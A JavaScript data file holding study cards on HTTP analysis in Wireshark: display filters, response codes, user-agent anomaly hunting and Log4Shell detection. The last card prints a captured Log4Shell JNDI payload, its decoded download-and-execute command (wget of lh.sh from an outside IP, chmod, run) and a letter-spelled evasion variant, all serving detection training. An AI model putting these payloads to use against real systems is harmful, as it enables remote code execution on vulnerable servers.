export default {
  id: "http-analysis",
  title: "Wireshark — Cleartext Protocol Analysis: HTTP",
  src: "Wireshark: Traffic Analysis",
  icon: "🌐",
  cards: [
    {
      title: "Why HTTP matters",
      blocks: [
        { t: "txt", text: "HTTP is cleartext, request-response, and essentially never blocked outbound — the backbone of web traffic. That combination makes it a prime lens for detecting phishing pages, web attacks, data exfiltration, and C2 traffic." },
        { t: "cmd", label: "global (HTTP/1.x and HTTP/2)", code: "http\nhttp2" },
        { t: "note", kind: "info", text: "<b>HTTP/2</b> is a separate dissector — binary framing + request/response multiplexing for performance. If a capture looks HTTP-light, check <code>http2</code> before assuming there's no web traffic." },
      ],
    },
    {
      title: "Request methods & response codes",
      span2: true,
      blocks: [
        { t: "cmd", label: "methods", code: "http.request.method == \"GET\"\nhttp.request.method == \"POST\"\nhttp.request                          # all requests, any method" },
        { t: "table", head: ["Code", "Meaning"], rows: [
          ["200", "OK — request successful"],
          ["301 / 302", "Moved Permanently / Temporarily"],
          ["400", "Bad Request — server didn't understand it"],
          ["401", "Unauthorised — needs login"],
          ["403", "Forbidden — no access"],
          ["404", "Not Found"],
          ["405", "Method Not Allowed"],
          ["408", "Request Timeout"],
          ["500", "Internal Server Error"],
          ["503", "Service Unavailable"],
        ]},
        { t: "cmd", label: "example response-code filters", code: "http.response.code == 200\nhttp.response.code == 401\nhttp.response.code == 403\nhttp.response.code == 404\nhttp.response.code == 405\nhttp.response.code == 503" },
      ],
    },
    {
      title: "URI & identity fields",
      blocks: [
        { t: "table", head: ["Field", "Meaning"], rows: [
          ["User-Agent", "Client browser/OS identification string"],
          ["Request URI", "The requested resource path"],
          ["Full URI", "Complete URI (scheme + host + path)"],
        ]},
        { t: "cmd", code: "http.user_agent contains \"nmap\"\nhttp.request.uri contains \"admin\"\nhttp.request.full_uri contains \"admin\"" },
      ],
    },
    {
      title: "Server / host / content fields",
      blocks: [
        { t: "table", head: ["Field", "Meaning"], rows: [
          ["Server", "Server software banner"],
          ["Host", "Hostname the client asked for"],
          ["Connection", "Keep-Alive / close state"],
          ["Line-based text data", "Cleartext response body"],
          ["HTML Form URL Encoded", "Submitted web form data — same field the ARP/MITM section uses to count sniffed credentials (urlencoded-form.key)"],
        ]},
        { t: "cmd", code: "http.server contains \"apache\"\nhttp.host contains \"keyword\"\nhttp.host == \"keyword\"\nhttp.connection == \"Keep-Alive\"\ndata-text-lines contains \"keyword\"" },
      ],
    },
    {
      title: "User-Agent anomaly hunting",
      desc: "The field is a strong signal, never a trusted whitelist.",
      span2: true,
      blocks: [
        { t: "cmd", label: "global", code: "http.user_agent" },
        { t: "note", kind: "danger", title: "never whitelist a user-agent", text: "A \"normal-looking\" UA doesn't clear a host — sophisticated adversaries deliberately craft natural-looking strings. UA analysis is a <b>supporting</b> signal, not a verdict on its own." },
        { t: "table", head: ["Look for", "Why it matters"], rows: [
          ["Different UAs from the same host, short time window", "One real browser doesn't normally rotate identities rapidly"],
          ["Non-standard / custom UA strings", "Scripted clients often forget to mimic a real browser convincingly"],
          ["Subtle spelling errors", "\"Mozilla\" vs \"Mozlilla\"/\"Mozlila\" — typosquat-style tells, easy to miss skimming"],
          ["Known audit-tool signatures", "Nmap, Nikto, Wfuzz, sqlmap often leave their name in the UA by default"],
          ["Payload data IN the UA field", "Some exploits (Log4Shell) stash the exploit string in a header, not just the URL"],
        ]},
        { t: "cmd", label: "known offensive tool signatures", code: "(http.user_agent contains \"sqlmap\") or (http.user_agent contains \"Nmap\") or\n(http.user_agent contains \"Wfuzz\") or (http.user_agent contains \"Nikto\")" },
        { t: "note", kind: "info", text: "Unsure if a UA string is legitimate? Web-search the exact string against known default UAs before calling it anomalous — validate, don't guess." },
      ],
    },
    {
      title: "Log4j (Log4Shell) detection",
      desc: "Research the attack BEFORE opening Wireshark — know what you're hunting.",
      span2: true,
      blocks: [
        { t: "note", kind: "danger", title: "known cleartext patterns", text: "The exploit string is passed as attacker-controlled input (often a header like User-Agent) and gets logged by vulnerable Log4j — triggering a JNDI lookup to attacker infrastructure. Two textbook substrings: <code>jndi:ldap</code> and <code>Exploit.class</code>." },
        { t: "cmd", label: "the attack starts with POST", code: "http.request.method == \"POST\"" },
        { t: "cmd", label: "known exploit substrings, anywhere in IP layer / whole frame", code: "(ip contains \"jndi\") or (ip contains \"Exploit\")\n(frame contains \"jndi\") or (frame contains \"Exploit\")" },
        { t: "cmd", label: "obfuscation tells in the UA field", code: "(http.user_agent contains \"$\") or (http.user_agent contains \"==\")" },
        { t: "note", kind: "warn", title: "why $ and ==", text: "Log4Shell payloads use <b>JNDI lookup syntax</b> (<code>${jndi:ldap://...}</code>) — the <code>$</code> is a strong tell. <code>==</code> is base64 padding — attackers often base64-encode the second-stage payload/class reference to dodge naive string-matching WAFs. Both showing up in a UA field (where neither belongs) is the anomaly." },
      ],
    },
    {
      title: "Worked example — confirmed exercise pcap",
      desc: "Real JNDI payload, decoded end to end (packet 444).",
      span2: true,
      blocks: [
        { t: "cmd", label: "the JNDI payload", code: "${jndi:ldap://45.137.21.9:1389/Basic/Command/Base64/d2dldCBodHRwOi8vNjIuMjEwLjEzMC4yNTAvbGguc2g7Y2htb2QgK3ggbGguc2g7Li9saC5zaA==}" },
        { t: "note", kind: "info", title: "the letter-spelled evasion variant", text: "The same attack often shows up spelling <code>jndi:ldap</code> one letter at a time via nested lookups — <code>${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://...}</code> — specifically to dodge detection rules that string-match the literal word \"jndi\". Log4j still resolves it correctly; naive filters don't catch it." },
        { t: "cmd", label: "decode the Base64/ segment (strip a trailing } by hand if present — CyberChef's 'Remove non-alphabet chars' does this automatically)", code: "echo \"d2dldCBodHRwOi8vNjIuMjEwLjEzMC4yNTAvbGguc2g7Y2htb2QgK3ggbGguc2g7Li9saC5zaA==\" | base64 -d" },
        { t: "cmd", label: "decoded output", code: "wget http://62.210.130.250/lh.sh; chmod +x lh.sh; ./lh.sh" },
        { t: "note", kind: "danger", title: "two-stage infrastructure", text: "<code>45.137.21.9:1389</code> = <b>stage 1</b>, the LDAP server Log4j connects to for the malicious JNDI reference. <code>62.210.130.250</code> = <b>stage 2</b>, the actual payload host serving <code>lh.sh</code> — this is the IP a \"which IP did the adversary contact\" question wants, since it only surfaces after decoding, unlike the stage-1 IP which sits in plaintext in the JNDI string." },
        { t: "note", kind: "ok", title: "chmod +x — same move as FTP's SITE CHMOD", text: "Download → <code>chmod +x</code> → execute is the exact same attacker goal as <code>SITE CHMOD 777</code> in the FTP section: flip the execute bit on a delivered payload so it actually runs. Different transport, same technique." },
      ],
    },
  ],
};
